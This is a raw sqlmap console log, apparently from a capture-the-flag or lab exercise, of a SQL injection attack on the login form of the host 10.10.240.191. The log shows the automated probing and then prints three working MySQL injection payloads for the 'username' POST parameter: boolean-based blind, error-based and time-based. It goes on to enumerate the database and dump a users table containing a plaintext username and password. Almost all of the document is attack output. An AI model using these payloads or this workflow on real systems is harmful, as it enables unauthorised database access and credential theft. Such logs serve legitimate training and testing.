        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.4#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:04:36 /2020-08-26/

[03:04:36] [INFO] testing connection to the target URL
[03:04:36] [INFO] searching for forms
[#1] form:
POST http://10.10.240.191/administrator.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] [03:04:55] [INFO] using '/home/kali/.sqlmap/output/results-08262020_0304am.csv' as the CSV results file in multiple targets mode
[03:04:56] [INFO] checking if the target is protected by some kind of WAF/IPS
[03:04:56] [INFO] testing if the target URL content is stable
[03:04:56] [INFO] target URL content is stable
[03:04:56] [INFO] testing if POST parameter 'username' is dynamic
[03:04:57] [WARNING] POST parameter 'username' does not appear to be dynamic
[03:04:57] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[03:04:58] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
[03:04:58] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] [03:06:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:06:02] [WARNING] reflective value(s) found and filtering out
[03:06:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:06:07] [INFO] testing 'Generic inline queries'
[03:06:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[03:06:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[03:06:43] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[03:07:01] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[03:07:03] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="Got")
[03:07:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[03:07:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[03:07:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[03:07:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[03:07:05] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[03:07:05] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[03:07:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[03:07:06] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[03:07:06] [INFO] POST parameter 'username' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[03:07:06] [INFO] testing 'MySQL inline queries'
[03:07:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[03:07:07] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[03:07:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[03:07:08] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[03:07:08] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[03:07:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[03:07:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:07:22] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[03:07:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:07:22] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[03:07:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:07:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[03:07:24] [INFO] target URL appears to have 2 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[03:09:31] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[03:09:41] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[03:09:51] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[03:10:00] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[03:10:09] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[03:10:18] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[03:10:28] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[03:10:37] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[03:10:46] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[03:10:55] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 380 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=ajVa' RLIKE (SELECT (CASE WHEN (4640=4640) THEN 0x616a5661 ELSE 0x28 END))-- lcYh&password=

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=ajVa' OR (SELECT 5842 FROM(SELECT COUNT(*),CONCAT(0x717a717171,(SELECT (ELT(5842=5842,1))),0x7176767171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ERcH&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=ajVa' AND (SELECT 5255 FROM (SELECT(SLEEP(5)))HIiN)-- FXpu&password=
---
do you want to exploit this SQL injection? [Y/n] 
[03:16:58] [INFO] the back-end DBMS is MySQL
[03:16:58] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
back-end DBMS: MySQL >= 5.0
[03:17:02] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[03:17:02] [INFO] fetching current database
[03:17:02] [INFO] retrieved: 'users'
[03:17:02] [INFO] fetching tables for database: 'users'
[03:17:03] [INFO] retrieved: 'users'
[03:17:03] [INFO] fetching columns for table 'users' in database 'users'
[03:17:04] [INFO] retrieved: 'username'
[03:17:04] [INFO] retrieved: 'varchar(100)'
[03:17:05] [INFO] retrieved: 'password'
[03:17:05] [INFO] retrieved: 'varchar(100)'
[03:17:05] [INFO] fetching entries for table 'users' in database 'users'
[03:17:06] [INFO] retrieved: 'secretpass'
[03:17:06] [INFO] retrieved: 'pingudad'
Database: users
Table: users
[1 entry]
+----------+------------+
| username | password   |
+----------+------------+
| pingudad | secretpass |
+----------+------------+

[03:17:06] [INFO] table 'users.users' dumped to CSV file '/home/kali/.sqlmap/output/10.10.240.191/dump/users/users.csv'
[03:17:06] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.sqlmap/output/results-08262020_0304am.csv'
[03:17:06] [WARNING] you haven't updated sqlmap for more than 145 days!!!

[*] ending @ 03:17:06 /2020-08-26/

